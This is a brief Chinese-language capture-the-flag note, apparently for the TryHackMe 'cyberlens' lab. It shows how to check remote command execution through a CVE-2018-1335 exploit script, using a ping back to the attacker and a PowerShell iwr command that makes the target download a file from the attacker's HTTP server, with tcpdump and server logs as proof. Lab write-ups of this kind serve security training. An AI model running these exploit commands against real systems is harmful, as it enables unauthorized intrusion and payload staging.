# checkCmd
確認靶機是否成功執行 cmd

## cmd

### ping
讓靶機 ping 自己確認 cmd 是否有成功執行
```bash
┌──(kali㉿kali)-[~/tryhackme/cyberlens]
└─$ python3 CVE-2018-1335.py cyberlens.thm 61777 "ping -n 2 10.4.11.38"                    
```
```bash
┌──(kali㉿kali)-[~/tools]
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:44:26.551458 IP cyberlens.thm > 10.4.11.38: ICMP echo request, id 1, seq 23, length 40
13:44:26.551477 IP 10.4.11.38 > cyberlens.thm: ICMP echo reply, id 1, seq 23, length 40
13:44:27.735260 IP cyberlens.thm > 10.4.11.38: ICMP echo request, id 1, seq 24, length 40
13:44:27.735285 IP 10.4.11.38 > cyberlens.thm: ICMP echo reply, id 1, seq 24, length 40
^C
4 packets captured
4 packets received by filter
0 packets dropped by kernel

```

### 下載檔案

```bash
┌──(kali㉿kali)-[~/tryhackme/cyberlens]
└─$ python3 CVE-2018-1335.py cyberlens.thm 61777 "powershell -c \"iwr 10.4.11.38/test.txt -out test.txt\""
```
```bash
┌──(kali㉿kali)-[~/tryhackme/cyberlens]
└─$ python3 -m http.server 80                                          
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.219.99 - - [18/Nov/2025 14:07:19] "GET /test.txt HTTP/1.1" 200 -
10.10.219.99 - - [18/Nov/2025 14:07:23] "GET /test.txt HTTP/1.1" 200 -

```